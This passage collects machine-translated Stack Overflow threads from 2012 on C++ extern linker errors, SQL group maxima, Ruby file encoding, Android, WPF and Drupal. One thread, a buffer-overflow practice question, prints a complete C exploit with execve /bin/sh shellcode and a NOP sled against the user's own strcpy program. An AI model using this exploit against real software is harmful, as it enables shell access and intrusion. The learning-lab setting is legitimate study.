  "_maxverts", referenced from:
      init()    in main.o
      readFile(char const*)in readfile.o
  "_shininess", referenced from:
      readFile(char const*)in readfile.o
  "_specular", referenced from:
      readFile(char const*)in readfile.o
  "_spherecount", referenced from:
      init()    in main.o
  "_spheres", referenced from:
      readFile(char const*)in readfile.o
  "_triangles", referenced from:
      readFile(char const*)in readfile.o
  "_tricount", referenced from:
      init()    in main.o
  "_trinormals", referenced from:
      readFile(char const*)in readfile.o
  "_trinormcount", referenced from:
      init()    in main.o
  "_upx", referenced from:
      init()    in main.o
      initCamera(float*)in readfile.o
  "_upy", referenced from:
      init()    in main.o
      initCamera(float*)in readfile.o
  "_upz", referenced from:
      init()    in main.o
      initCamera(float*)in readfile.o
  "_vertexcount", referenced from:
      init()    in main.o
  "_vertexnormcount", referenced from:
      init()    in main.o
  "_vertices", referenced from:
      readFile(char const*)in readfile.o
  "_vertnormals", referenced from:
      readFile(char const*)in readfile.o
  "_width", referenced from:
      init()    in main.o
      readFile(char const*)in readfile.o
ld: symbol(s) not found for architecture x86_64
collect2: ld returned 1 exit status 
```

下面是变量.h..

```
#include "vertexnormal.h"
#include "sphere.h"
#include "tri.h"
#include "trinormal.h"
#include "vec.h"

#include <string>
#include <vector>

using namespace std;

// width and height specify image size
extern float width;
extern float height;

// maximum depth for a ray (level of recursion)
extern int depth;

// the output file to which the image should be written
extern string filename;

// camera specifiations (should i put in a struct?)
extern float lookfromx;
extern float lookfromy;
extern float lookfromz;
extern float lookatx;
extern float lookaty;
extern float lookatz;
extern float upx;
extern float upy;
extern float upz;
extern float fov;

//***************************//
//  Geometry Specifications  //
//***************************//

// specifies the number of vertrices for tri specifications
extern int maxverts;

// specifies the number of vertices with normals for tri specifications
extern int maxvertnorms;

// pile of inputted vertices
// might need to #include glm file                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
extern vector<vec> vertices;

// pile of inputted vertices with specified normals
extern vector<vertexNormal> vertnormals;

// pile of inputted spheres
extern vector<sphere> spheres;

// pile of inputted triangles
extern vector<tri> triangles;

// pile of inputted triangles using vertices with specified normals 
extern vector<triNormal> trinormals;

extern int vertexcount;
extern int vertexnormcount;
extern int spherecount;
extern int tricount;
extern int trinormcount;

//**************************//
//  Materials Specifiations //
//**************************//

extern float diffuse[3];
extern float specular[3];
extern float shininess;
extern float emission[3]; 
```

这是我的 main.cpp，

```
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>

#include "Objects.h"

using namespace std;

#include "readfile.h"
#include "variables.h"

void init() {
    cout << "Reading in scene file... \n";
    cout << "Image size has been set to a " << width << " x " << height << " output. /n";
    cout << "The maximum recursion depth has been set to " << depth << ". \n";
    cout << "The image will be output to " << filename << ".png. \n";

    cout << "The camera has been instantiated with the following properties: \n";
    cout << "\t POSITION: (" << lookfromx << ", " << lookfromy << ", " << lookfromz << ") \n";
    cout << "\t DIRECTION: (" << lookatx << ", " << lookaty << ", " << lookatz << ") \n";
    cout << "\t UP: (" << upx << ", " << upy << ", " << upz << ") \n";
    cout << "\t FIELD OF VIEW: " << fov << " \n";

    cout << "An amount of " << vertexcount << " vertices has been specified with a maximum of " << maxverts << " allowed. \n";
    cout << "An amount of " << vertexnormcount << " vertices with normals has been specified with a maximum of " << maxvertnorms << " allowed. \n"; 

    cout << "An amount of " << spherecount << " spheres have been specified. \n";
    cout << "An amount of " << tricount << " triangles have been specified. \n";
    cout << "An amount of " << trinormcount << " triangles with calculated vertex normals have been specified. \n";
}

int main (int argc, char * argv[]) {
    readFile(argv[1]);
    init();
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T08:20:43.627

试试这个：

1.  打开你的 variables.h 头文件。
2.  复制所有`extern`变量声明。
3.  打开你的 main.cpp 文件。
4.  粘贴从 (2) 复制的所有声明。
5.  在同一个 main.cpp中，从每个声明**中删除**关键字。`extern`
6.  保存所有文件。
7.  查找如何`extern`工作。有件事告诉我你在学习中错过了这一点。

好的，这已经在 SO what 中介绍了几千次，但是对于 OP：

**声明变量的存在**

```
// DECLARE myvar, an int variable. no storage has been set aside
//  this is simply telling the compiler this thing exists.. somewhere.
extern int myvar; 
```

**定义变量的存在**

```
// DEFINE myvar, an int variable. storage *is* set aside here.
//  only ONE of these, by this name, can be in your global 
//  namespace in your program.
int myvar = 0; 
```

传统上，`extern`声明位于标头中，但定义**始终**位于 c/cpp 文件中。程序中使用的任何 -declared 变量都**必须**有一个匹配的定义。`extern`

**这如何适合您的情况您的** 所有变量都在中*声明*`variables.h`，但无论如何都没有*定义。*通过告诉您将所有这些声明复制/粘贴到源文件中（任何都可以；我选择 main.cpp 因为它已经在您的项目中），然后*删除*该源文件中的`extern`关键字*（不是标题）*，您就是基本上**定义**了它们都正式存在的地方。现在，在您的其他源文件中对 'ed 变量的所有引用`extern`终于在链接时有了一些关联。

**边栏** 在**定义**变量的 c/cpp 文件中，确保将它们初始化为正确的值。这是您唯一可以做到的地方。你不能在任何`extern`声明上这样做。它只能在**定义**上完成。

头文件

```
extern int myvar; // note: no initial value. 
```

源文件

```
int myvar = 0; // note: initialized to zero (0) 
```

我*希望*这至少有点道理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T08:09:45.080

```
extern float lookfromx;
extern float lookfromy;
extern float lookfromz;
extern float lookatx;
extern float lookaty;
extern float lookatz; 
```

这些只是声明。您需要在程序的某处定义这些变量（例如，在 variables.cpp 中）。要进行这些定义，您可以

*   去掉 extern 关键字

*   添加一个初始化器 ( = value; )

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T08:15:22.197

您的 variable.h 文件只是使您的变量可在全局范围内的其他文件中移植，但仍需要声明它们。确保在主文件中声明实际变量（初始化的常规方法）。

> extern 关键字声明一个变量或函数，并指定它具有外部链接（它的名称在定义它的文件之外的文件中可见）。修改变量时，extern 指定变量具有静态持续时间（在程序开始时分配，在程序结束时释放）。变量或函数可以在另一个源文件中定义，或者稍后在同一文件中定义。默认情况下，文件范围内的变量和函数声明是外部的。

[阅读有关 extern 关键字的更多信息](http://msdn.microsoft.com/en-us/library/0603949d%28v=vs.80%29.aspx)

# sql - 在 SQL 中使用 max()

> ID：13217069
> 
> 赞同：1
> 
> 时间：2012-11-04T08:06:38.357
> 
> 标签：sql, database, select

我的家庭作业的一部分是找到每个部门平均分最高的学生。

询问：

```
SELECT g.sid as studentID, s.sfirstname, s.dcode, AVG(grade) as average
FROM studentgrades g, student s
WHERE g.sid = s.sid
GROUP BY s.sid 
```

结果：

```
1   Robert  ger 80.0000
2   Julie   sta 77.0000
3   Michael csc 84.0000
4   Julia   csc 100.0000
5   Patric  csc 86.0000
6   Jill    sta 74.5000 
```

为了回答这个问题，我运行了查询

```
SELECT dcode, averages.sfirstName, MAX(averages.average)
FROM (
    SELECT g.sid as studentID, s.sfirstname, s.dcode, AVG(grade) as average
    FROM studentgrades g, student s
    WHERE g.sid = s.sid
    GROUP BY s.sid) averages
GROUP BY dcode 
```

结果：

```
csc Michael 100.0000
ger Robert  80.0000
sta Julie   77.0000 
```

即使平均值是正确的，名称也不正确！朱莉娅是 csc 平均 100 分的人，那么迈克尔为什么会出现呢？

* * *

这是一个例子：

学生参加课程并获得这些课程的成绩。例如：

```
student1 from dept1 took course A and got grade 80
student1 from dept1 took course B and got grade 90
student2 from dept1 took course C and got grade 100
student3 from dept2 took course X and got grade 90 
```

运行第一个查询后，我们得到每个学生的平均值

```
student 1 from dept1 has average 85
student 2 from dept1 has average 100
student 3 from dept2 has average 90 
```

现在我们找到每个部门平均分最高的学生

```
dept1, student2, 100
dept2, student3, 90 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T08:28:00.360

应该这样做（并且它根据 SQL 标准使用 GROUP BY，而不是 MySQL 实现它的方式）

```
select s.sid,
       s.sfirstname,
       s.dcode,
       ag.avg_grade
from students s
  join (select sid, avg(grade) as avg_grade
        from studentgrades 
        group by sid) ag on ag.sid = s.sid
  join (select s.dcode,
               max(avg_grade) max_avg_grade
        from students s 
          join (select sid, avg(grade) as avg_grade
                from studentgrades 
                group by sid) ag on ag.sid = s.sid
        group by s.dcode) mag on mag.dcode = s.dcode and mag.max_avg_grade = ag.avg_grade
order by mag.avg_grade; 
```

### 这是如何工作的

这通过几个步骤建立了结果。首先，它计算每个学生的平均成绩：

```
select sid, avg(grade) as avg_grade
from studentgrades 
group by sid 
```

根据这个语句的结果，我们可以计算出最大值。平均水平：

```
select s.dcode,
       max(avg_grade) max_avg_grade
from students s 
  join (select sid, avg(grade) as avg_grade
        from studentgrades 
        group by sid) ag on ag.sid = s.sid
group by s.dcode 
```

现在这两个结果被加入到学生表中。为了便于阅读，假设有一个名为`average_grades`（第一个语句）和`max_average_grades`（第二个语句）的视图。

最后的语句基本上是这样做的：

```
select s.sid,
       s.sfirstname,
       s.dcode,
       ag.avg_grade
from students s
  join avg_grades ag on ag.sid = s.sid
  join max_avg_grades mag 
    on mag.dcode = s.dcode 
   and mag.max_avg_grade = ag.avg_grade; 
```

真正的（我回答中的第一个）只是简单地替换了名称`avg_grades`和`max_avg_grades`我显示的选择。这就是为什么它看起来如此复杂。

### 标准 SQL 中的解决方案，更具可读性

在标准 SQL 中，这可以使用通用表表达式来表达，这使得它更具可读性（但本质上是相同的）

```
with avg_grades (sid, avg_grade) as (
  select sid, avg(grade) as avg_grade
  from studentgrades 
  group by sid
), 
max_avg_grades (dcode, max_avg_grade) as (
  select s.dcode, max(avg_grade) max_avg_grade
  from students s 
     join avg_grades ag on ag.sid = s.sid
  group by s.dcode
)
select s.sid,
       s.sfirstname,
       s.dcode,
       ag.avg_grade
from students s
  join avg_grades ag on ag.sid = s.sid
  join max_avg_grades mag on mag.dcode = s.dcode and mag.max_avg_grade = ag.avg_grade; 
```

但是 MySQL 是极少数不支持此功能的 DBMS 之一，因此您需要坚持最初的声明。

### 需要较少派生表的标准 SQL 解决方案

在标准 SQL 中，使用窗口函数来计算部门内的排名甚至可以写得更短一些（同样这在 MySQL 中不起作用）

```
with avg_grades (sid, avg_grade) as (
  select sid, avg(grade) as avg_grade
  from studentgrades 
  group by sid
)
select sid, 
       sfirstname,
       dcode,
       avg_grade
from (       
  select s.sid,
         s.sfirstname,
         s.dcode,
         ag.avg_grade,
         rank() over (partition by s.dcode order by ag.avg_grade desc) as rnk
  from students s
    join avg_grades ag on ag.sid = s.sid
) t
where rnk = 1; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T08:11:46.517

更新查询以使用`HAVING`如下子句：

```
 SELECT dcode, averages.sfirstName, averages.average
   FROM (
       SELECT g.sid as studentID, s.sfirstname, s.dcode, AVG(grade) as average
       FROM studentgrades g, student s
       WHERE g.sid = s.sid
       GROUP BY s.sid) averages
  GROUP BY dcode
  HAVING MAX(averages.average) = averages.average 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T10:33:17.587

有许多不同的解决方案。也许这个更容易理解：

```
/* create a new temporariy table of student performance. to keep the code clean and the performance better */
INSERT INTO studentperformance (studentID, sfirstname, dcode, average)
SELECT g.sid as studentID
     , s.sfirstname
     , s.dcode
     , AVG(grade) as average
FROM studentgrades g, student s
WHERE g.sid = s.sid
GROUP BY s.sid;

/* best grades for each department */
INSERT INTO bestgrades (best_average_per_department)
SELECT (dcode + '|' + MAX(average)) as best_average_per_department /* important string. maybe one has to cast the max(average) to string for this to work */
FROM studentperformance
GROUP BY dcode; /* important groub by ! */

/* get all the students who are best in each department */
SELECT a.studentID
     , a.sfirstname
     , a.dcode
     , a.average
FROM studentperformance as a
JOIN bestgrades as b on (a.dcode + '|' + a.average) = b.best_average_per_department; 
```

# ubuntu-11.10 - 基本缓冲区溢出练习

> ID：13217071
> 
> 赞同：2
> 
> 时间：2012-11-04T08:06:53.430
> 
> 标签：ubuntu-11.10, buffer-overflow

我最近一直在练习一些基本的基于堆栈的缓冲区溢出任务，我写了一个这样的易受攻击的程序：

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc,char **argv)
{
        if (argc<2) {
                puts("Need enough args!!");
                exit(0);
        }

        char buf[400];
        strcpy(buf,argv[1]);
        printf("Hi, %s\n",buf);
        return 0;
} 
```

和这样的漏洞利用程序：

```
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#define ATK_L 430
#define VUL_L 400
#define NOP_L 12

int main(){
    char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                "\x68\x68\x2f\x62\x69\x6e\x89"
                "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                "\xcd\x80\x31\xc0\x40\xcd\x80";

    char *atk,vul[]="./vul1 ";
    atk=(char*)malloc(sizeof(char)*ATK_L);
    unsigned long i,ret,*ptr,ptr2;

    ret=(unsigned long)atk;
    ptr=(unsigned long*)atk;

    for(i=0;i<ATK_L;i+=4){
        *(ptr++)=ret;
    }

    for(i=0;i<NOP_L;i++){
        atk[i]='\x90';
    }

    ptr2=0;
    for(i=NOP_L;i<NOP_L+strlen(shellcode);i++){
        atk[i]=shellcode[ptr2++];
    }
    atk[ATK_L-1]='\0';

    strcat(vul,atk);

    system(vul);

    free(atk);

    return 0;   
} 
```

由于我不想确定偏移量，所以我只是跳回到`atk`数组的开头。我在编译时关闭了 ASLR 并放置了`-fno-stack-protector`标志，但是当我运行漏洞利用程序时，它只是说核心转储而不做任何事情！我使用 gdb 调试漏洞利用程序，它说它在`getenv`函数中被杀死，我无法理解。

我在 ubuntu 11.10 32bits 上工作

非常感谢 ：-）

# arrays - 为什么我从文件中读取的数组包含字节

> ID：13217076
> 
> 赞同：-2
> 
> 时间：2012-11-04T08:07:51.557
> 
> 标签：arrays, ruby, file

我正在编写一个小系统，它解析用逗号分隔的 txt 中的数据行，所以基本来说，我将文件行读入一个数组，然后在数组上使用 .each 并用“'”分割所有内容，然后推送将它放入作为由文件创建的数据库返回的保存数组中，我做了两个，第一个工作正常，但它的数据用关键字逐行存储，这个工作正常，访问和返回都很好。

我正在使用包含这样的文本数据的文件

* * *

```
476,TACKLE,40,25,30,0,0,1,A3F,move description string with, punctuation and t's
477,ANOTHERATTACK,BLAHBLAHBLAH,1,2,3,4 
```

* * *

这将是一种正确的数据解析，嗯

所以我去：

* * *

```
$fs  = File_SYstem.new
@path = Dir.getwd.to_S + "/desktop/file.txt"
@data_lines = $fs.file_read_lines(@path)
@data = []
@data_lines.each do |line|
  @data >> line.split(',')
end
return @data
#this would make an array of the lines, each line being an array of its elements, right?

@data = The_Code_Above_In_A_Class.new(@path)
=>@data

@data[0]
=>"354,FISSURE,10,40,50,blah blah blah, the second half of the text."

#hmmmm

@data[0][0]
=>"354" 
```

所以它似乎工作正常，但有时，开头的数字以字节的形式返回：O

例如：

```
@data.each do |line|
  puts line[1].to_S #return second element which is name of move
end 
```

这将打印一个预期名称的列表，很好而且花花公子，但随后我得到了我没有要求的剩余数据，以无法识别的模式返回到它下面。

也许我可以做到这一点？

```
array = [1,2,3]
array = [array,array,array]
array[2][0] = "Hello!"
array.each do |item|
  puts item[2]
end
 =>"3"
"3"
"Hello!"
=>: 
```

* * *

在我看来，这应该可行，因为我已经在其他地方成功地使用了这种风格的紧密变体。

现在这是一个真正的 580 行文件的示例：

* * *

```
1,MEGAHORN,Megahorn,000,120,BUG,Physical,85,10,0,00,0,abef,Cool,"Using its tough and  impressive horn, the user rams into the target with no letup."
2,ATTACKORDER,Attack Order,000,90,BUG,Physical,100,15,0,00,0,befh,Smart,The user calls out its underlings to pummel the target. Critical hits land more easily.
3,BUGBUZZ,Bug Buzz,046,90,BUG,Special,100,10,10,00,0,bek,Cute,The user vibrates its wings to generate a damaging sound wave. It may also lower the target's Sp. Def stat. 
```

* * *

现在这是我用来加载它的类：

```
class Move_Data_Extracter
  def initialize(path)
        load $path.to_s + "/source/string_helper.rb"
    #load "/mnt/sdcard/pokemon/system/source/string_helper.rb"
        @path = path.to_s
    @file_lines = $file_system.file_read_lines(@path.to_s)
    $movedata = []
    @file_lines.each do |line|
      $movedata << line.split(",")
    end
  end
  def get_move_id(move_name)
    $movedata.each do |move|
      if move[1].upcase.to_s == move_name.upcase.to_s
            return move[0].to_i
      else
        return "Move Doesnt Exist In The System!"
      end
    end
  end
 end 
```

* * *

这是我访问返回数组中的第一项时得到的反馈：

* * *

```
irb(main):002:0> $movedata[0]
=> ["\xEF\xBB\xBF1", "MEGAHORN", "Megahorn", "000", "120", "BUG", "Physical", "8
5", "10", "0", "00", "0", "abef", "Cool", "\"Using its tough and impressive horn
", " the user rams into the target with no letup.\"\n"]
irb(main):003:0> $movedata[0][0]
=> "\xEF\xBB\xBF1"
irb(main):004:0> 
```

这次访问工作正常，但第一个元素是字节，我尝试的每个方法都出错了。

谁能弄清楚这里有什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T08:36:56.893

首先，这显然不是您正在使用的代码，因为`to_S`它不是 ruby​​ 的一部分，并且无论如何都会立即失败。

让我们稍微清理一下代码：

```
# $fs  = File_SYstem.new # this is just not needed
path = File.expand_path "/desktop/file.txt" # instance variables *only* within explicit objects
data_lines = File.read( path ).split "," 
```

我不知道你写的其余部分的真正含义。

这输出：

```
# => ["476", "TACKLE", "40", "25", "30", "0", "0", "1", "A3F", "move description string with", " punctuation and t's\n477", "ANOTHERATTACK", "BLAHBLAHBLAH", "1", "2", "3", "4"] 
```

这段代码 - 它是什么？

```
array = [1,2,3]
array = [array,array,array] # pure craziness!
array[2][0] = "Hello!"
array.each do |item|
  puts item[2]
end
 =>"3"
"3"
"Hello!"
=>: 
```

至于为什么要取回字节，这是因为该文件（可能）被编码为 UTF-8。尝试`File.read( path, "r:UTF-8")`让 Ruby 使用正确的编码。

# android - Android解除分配位图进入“未知”内存

> ID：13217081
> 
> 赞同：7
> 
> 时间：2012-11-04T08:09:35.470
> 
> 标签：android, memory, bitmap, garbage-collection, ddms

我正在制作一个素描应用程序，主要是为了好玩。但我遇到了一个问题。

在我的应用程序中，用户可以“翻转”他们已经绘制的草图。这些草图只是 400x800 位图。但是我经常遇到内存不足的错误。

一旦用户离开草图，草图就会被保存到 SD 中，然后它们会被释放...

```
if(bitmap != null)
{
bitmap.recycle();
bitmap = null;
} 
```

因此，在任何给定时间，在保存和释放它们之前，只应将一两个位图加载到内存中。通过一些调试打印，我确定这是真的（内存中最多同时有两个位图）。我的问题是，在 14 次加载/释放后，程序崩溃并出现 OutOfMemoryError。总是 14，无论我在“翻转”之间等待多长时间。

我尝试打开 DDMS 来查看设备的内存分配情况。奇怪的是，每次释放图像时，内存都会进入“未知”部分，而不是“空闲”部分。这种情况一直持续到只剩下一小部分“空闲”内存，此时发生崩溃（并且“未知”内存变为“空闲”）。

经过大量谷歌搜索，我发现一些资源说位图应该[按预期释放](https://stackoverflow.com/questions/1945142/bitmaps-in-android)，并且[Dalvik 垃圾收集总是发生在内存不足错误之前](http://dubroy.com/blog/google-io-memory-management-for-android-apps/)。还有一些杂项页面表明位图使用的所有内存都在 GC 时释放（本机和 JVM 堆类似）

在这一点上，我应该注意，我正在两部不同的手机上进行测试。摩托罗拉 Droid X（库存图片，Android 2.3.3）和三星 Galaxy S3（Cyanogenmod 9，Android 4.0.4）。两者都表现出完全相同的行为。我的 android 工具在所有 SDK 版本中都是最新的，我已经检查了一百万次以确保我的代码中没有其他任何东西在做任何奇怪的分配（实际上在程序启动后没有分配任何东西）。

**那么**，我应该如何正确释放位图以便释放它（不仅仅是“未知”），并且我可以在其他地方使用内存？作为一个补充问题，这个“未知”的内存池是什么，它的用途是什么？

编辑：语法和拼写，在平台上添加了一些注释。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-23T08:08:38.803

使用大图像（附近也有 1mb）。您可能在应用程序标记集大堆 true 中使用 androidmanifest。而不是使用自定义视图不使用 imageview（因为太复杂并且需要比其他视图更多）

# php - Pimcore 标头片段

> ID：13217085
> 
> 赞同：0
> 
> 时间：2012-11-04T08:10:24.473
> 
> 标签：php, cmd, pimcore

我正在尝试通过将此代码添加到布局来在每个页面上制作标题片段：

```
$s = Document_Snippet::getByPath('/snippets/');

if (is_object($s) && is_object($s->elements['header'])) 
{
echo $s->elements['header']->frontend();
} 
```

在管理面板中，我创建了文件夹“snippets”，添加了片段“header”并将类型“Header”添加到这个片段，创建了控制器和视图。

我想在每个页面上显示这个片段，但 pimcore 没有得到“标题”的片段对象。如果我输入这段代码：`echo $this->snippet("header");`它可以工作，但每次创建新页面时我都需要拖放标题片段。

在片段元素“header”的管理面板中，路径是“/snippets/”，键是“header”，ID是“4”。

如何解决我的问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T08:22:53.267

哎呀，我试着弄错了。

正确的方法是：`<?= $this->inc("/snippets/header") ?>`

# c#-4.0 - 如何将 Windows 8 应用程序发布到 Windows 商店？

> ID：13217086
> 
> 赞同：-1
> 
> 时间：2012-11-04T08:11:24.733
> 
> 标签：c#-4.0, windows-8, windows-store

如何将 windows 8 和 WP8 应用程序发布到 windows 商店？我使用 Visual Studio 2012 开发应用程序。请告诉我一些细节和步骤。非常感谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-05T09:04:56.673

[http://blogs.msdn.com/b/windowsstore/archive/2012/02/13/submitting-your-windows-8-apps.aspx](http://blogs.msdn.com/b/windowsstore/archive/2012/02/13/submitting-your-windows-8-apps.aspx) 检查这个链接...几乎所有关于发布你的应用程序

# windows-8 - 使用 Javascript 的 Windows 商店应用程序 - 如何在 html 中添加事件侦听器

> ID：13217093
> 
> 赞同：0
> 
> 时间：2012-11-04T08:13:10.820
> 
> 标签：windows-8, microsoft-metro

在使用 Javascript 的 Windows 商店应用程序中，我在 html 中定义了一个列表视图。

```
<div id ="menuListView" data-win-control="WinJS.UI.ListView" data-win-options="{
          itemDataSource: viewModel.items.dataSource,
          itemTemplate: menuItemTemplate,
          layout: {type: WinJS.UI.GridLayout}}"></div> 
```

我可以在 Javascript 中定义一个 click 事件处理程序，如下所示：

```
menuListView.addEventListener("selectionchanged", clickEventHandler, false); 
```

但是因为，我正在尝试使用 MVVM 模式，所以我想将这段代码放在 html 视图中，让视图模型处理点击事件。这有没有可能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T16:06:03.553

对于 WinJS 应用程序中的完整 NVVM 功能，我建议使用[http://knockoutjs.com之类的框架](http://knockoutjs.com)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-05T09:21:05.383

如果您继续在 HTML 视图中声明事件处理程序，您可能可以尝试这样的事情：

 **```
"<button id="button1" onselectionchange="clickEventHandler(event)">An HTML button</button>" 
```*  *希望这可以帮助 ：）**

# c# - 如何在 C# 中设置 Storyboard.TargetProperty？

> ID：13217094
> 
> 赞同：3
> 
> 时间：2012-11-04T08:13:19.103
> 
> 标签：c#, wpf, animation, storyboard

我正在用 C# 开发 wpf 应用程序。以下 xaml 代码对我来说工作正常。

```
<VisualStateManager.VisualStateGroups>
    <VisualStateGroup x:Name="VisualStateGroup">
        <VisualState x:Name="DefaultVisualState">
            <Storyboard/>
        </VisualState>
        <VisualState x:Name="FocusVisualState">
            <Storyboard>
                <ColorAnimationUsingKeyFrames Storyboard.TargetProperty="(Shape.Fill).(SolidColorBrush.Color)" Storyboard.TargetName="CircleEllipse1">
                    <EasingColorKeyFrame KeyTime="0" Value="#FF0004FF"/>
                </ColorAnimationUsingKeyFrames>
                <ColorAnimationUsingKeyFrames Storyboard.TargetProperty="(TextElement.Background).(SolidColorBrush.Color)" Storyboard.TargetName="TextBlock1">
                    <EasingColorKeyFrame KeyTime="0" Value="#FFBCB0B0"/>
                </ColorAnimationUsingKeyFrames>
            </Storyboard>
        </VisualState>
    </VisualStateGroup>
</VisualStateManager.VisualStateGroups> 
```

我用 C# 编写的相同代码

```
EasingColorKeyFrame easingColorKeyFrameObj = new EasingColorKeyFrame();
easingColorKeyFrameObj.KeyTime = KeyTime.FromTimeSpan(TimeSpan.FromSeconds(1));
easingColorKeyFrameObj.Value = Colors.Red;
ColorAnimationUsingKeyFrames colorAnimationUsingKeyFramesObj = new ColorAnimationUsingKeyFrames();
colorAnimationUsingKeyFramesObj.KeyFrames.Add(easingColorKeyFrameObj);
Storyboard.SetTargetName(colorAnimationUsingKeyFramesObj, "CircleEllipse1");
Storyboard.SetTargetProperty(
    colorAnimationUsingKeyFramesObj, new PropertyPath("Color"));

Storyboard myStoryboard = new Storyboard();
myStoryboard.Children.Add(colorAnimationUsingKeyFramesObj);

myStoryboard.Begin(this, true); 
```

在上面的代码中，我应该如何在 C# 中设置`Storyboard.TargetProperty="(Shape.Fill).(SolidColorBrush.Color)"`and`Storyboard.TargetProperty="(TextElement.Background).(SolidColorBrush.Color)"`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T09:39:37.320

您需要将其指定为字符串

```
private void AnimateColor(string ellipseName, Color ellipseColor, string textBlockName, Color textBlockColor)
            {
                EasingColorKeyFrame easingColorKeyFrameEllipseObj = new EasingColorKeyFrame();
                easingColorKeyFrameEllipseObj.KeyTime = KeyTime.FromTimeSpan(TimeSpan.FromSeconds(12));
                easingColorKeyFrameEllipseObj.Value = ellipseColor;

                ColorAnimationUsingKeyFrames colorAnimationUsingKeyFramesEllipseObj = new ColorAnimationUsingKeyFrames();
                Storyboard.SetTargetName(colorAnimationUsingKeyFramesEllipseObj, ellipseName);
                Storyboard.SetTargetProperty(
                    colorAnimationUsingKeyFramesEllipseObj, new PropertyPath("(Shape.Fill).(SolidColorBrush.Color)"));
                colorAnimationUsingKeyFramesEllipseObj.KeyFrames.Add(easingColorKeyFrameEllipseObj);

                EasingColorKeyFrame easingColorKeyFrameTextBlockObj = new EasingColorKeyFrame();
                easingColorKeyFrameTextBlockObj.KeyTime = KeyTime.FromTimeSpan(TimeSpan.FromSeconds(12));
                easingColorKeyFrameTextBlockObj.Value = textBlockColor;

                ColorAnimationUsingKeyFrames colorAnimationUsingKeyFramesTextBlockObj = new ColorAnimationUsingKeyFrames();
                Storyboard.SetTargetName(colorAnimationUsingKeyFramesTextBlockObj, textBlockName);
                Storyboard.SetTargetProperty(
                    colorAnimationUsingKeyFramesTextBlockObj, new PropertyPath("(TextElement.Background).(SolidColorBrush.Color)"));
                colorAnimationUsingKeyFramesTextBlockObj.KeyFrames.Add(easingColorKeyFrameTextBlockObj);

                Storyboard storyboard = new Storyboard();

                storyboard.Children.Add(colorAnimationUsingKeyFramesEllipseObj);
                storyboard.Children.Add(colorAnimationUsingKeyFramesTextBlockObj);

                storyboard.Begin(this, true);
            } 
```

# drupal - 如何在 Drupal 7 中自定义注册过程？

> ID：13217096
> 
> 赞同：2
> 
> 时间：2012-11-04T08:13:47.233
> 
> 标签：drupal, drupal-7, drupal-modules

我想在 Drupal 7 中自定义默认注册过程。注册过程包括 3 个步骤：

1.  显示一些帐户类型（在页面或表单中？）。例如“个人”、“企业”、“组织”……而用户会选择自己的账户类型。
2.  在注册表中填写信息。用户在步骤 1 中选择的每个帐户类型都有一些相应的字段。
3.  使用确认电子邮件或其他方式完成注册。

注册过程类似于[https://secure.payza.com/signup](https://secure.payza.com/signup)

感谢您的帮助。

# java - 我可以从语音识别中获取语音数据（mp3 格式的 fe）吗？

> ID：13217100
> 
> 赞同：3
> 
> 时间：2012-11-04T08:14:22.537
> 
> 标签：java, android, speech-recognition, voice-recognition, speech-to-text

> **可能重复：**
> [Android：录音和保存音频](https://stackoverflow.com/questions/10905337/android-voice-recording-and-saving-audio)

我是说 ;

我在 android 上使用语音识别类，我成功进行了语音识别。但我想要真实的语音数据而不是单词而不是它。例如，我说`'teacher'`和 android 让你说老师。哦，好的，但我想要我的声音，其中包括`'teacher'`。它在哪里？我可以拿走它并保存另一个位置吗？

我使用这个类来语音到文本：

```
package net.viralpatel.android.speechtotextdemo;

import java.util.ArrayList;

import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.os.Bundle;
import android.speech.RecognizerIntent;
import android.view.Menu;
import android.view.View;
import android.widget.ImageButton;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    protected static final int RESULT_SPEECH = 1;

    private ImageButton btnSpeak;
    private TextView txtText;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        txtText = (TextView) findViewById(R.id.txtText);

        btnSpeak = (ImageButton) findViewById(R.id.btnSpeak);

        btnSpeak.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {

                Intent intent = new Intent(
                        RecognizerIntent.ACTION_RECOGNIZE_SPEECH);

                intent.putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, "en-US");

                try {
                    startActivityForResult(intent, RESULT_SPEECH);
                    txtText.setText("");
                } catch (ActivityNotFoundException a) {
                    Toast t = Toast.makeText(getApplicationContext(),
                            "Ops! Your device doesn't support Speech to Text",
                            Toast.LENGTH_SHORT);
                    t.show();
                }
            }
        });

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        switch (requestCode) {
        case RESULT_SPEECH: {
            if (resultCode == RESULT_OK && null != data) {

                ArrayList<String> text = data
                        .getStringArrayListExtra(RecognizerIntent.EXTRA_RESULTS);

                txtText.setText(text.get(0));
            }
            break;
        }

        }
    }
} 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-05T08:36:13.180

